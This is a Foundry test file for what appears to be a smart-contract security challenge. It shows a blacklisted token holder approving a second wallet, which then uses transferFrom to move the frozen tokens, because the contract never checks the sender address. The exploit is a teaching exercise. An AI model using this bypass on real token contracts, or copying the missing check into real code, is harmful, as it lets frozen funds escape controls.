// SPDX-License-Identifier: CC-BY-NC-SA-4.0
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Challenge06} from "../src/Challenge06.sol";

contract Challenge06Test is Test {
    Challenge06 public challenge;
    address public alice = makeAddr("Alice");     // Contract owner
    address public bob = makeAddr("Bob");         // Target user who will be blacklisted
    address public bobsSecondWallet = makeAddr("BobsSecondWallet"); // Bob's secondary wallet

    function setUp() public {
        vm.prank(alice);
        challenge = new Challenge06();
        
        // Alice transfers tokens to Bob
        vm.prank(alice);
        challenge.transfer(bob, 1000 * 10**18);
    }

    function testBlacklistBypass() public {
        // STEP 1: Bob is blacklisted by contract owner
        vm.prank(alice);
        challenge.addToBlacklist(bob);
        
        // Verify Bob can't transfer tokens directly due to blacklist
        vm.prank(bob);
        vm.expectRevert("Sender or receiver blacklisted");
        challenge.transfer(bobsSecondWallet, 500 * 10**18);
        
        // STEP 2: Yet Bob can still approve his second wallet (not blacklisted) to spend tokens
        // This works because the approve function has no blacklist checks!
        vm.prank(bob);
        challenge.approve(bobsSecondWallet, 1000 * 10**18);
        
        // Verify the approval was successful
        assertEq(challenge.allowance(bob, bobsSecondWallet), 1000 * 10**18);
        
        // Record balances before the bypass
        uint256 bobBalanceBefore = challenge.balanceOf(bob);
        uint256 secondWalletBalanceBefore = challenge.balanceOf(bobsSecondWallet);
        
        // STEP 3: Bob's second wallet can now move tokens from blacklisted Bob
        // This works because transferFrom only checks if msg.sender and to are blacklisted, not from!
        vm.prank(bobsSecondWallet);
        challenge.transferFrom(bob, bobsSecondWallet, 500 * 10**18);
        
        // Verify the tokens were successfully moved despite Bob being blacklisted
        assertEq(challenge.balanceOf(bob), bobBalanceBefore - 500 * 10**18);
        assertEq(challenge.balanceOf(bobsSecondWallet), secondWalletBalanceBefore + 500 * 10**18);
    }
} 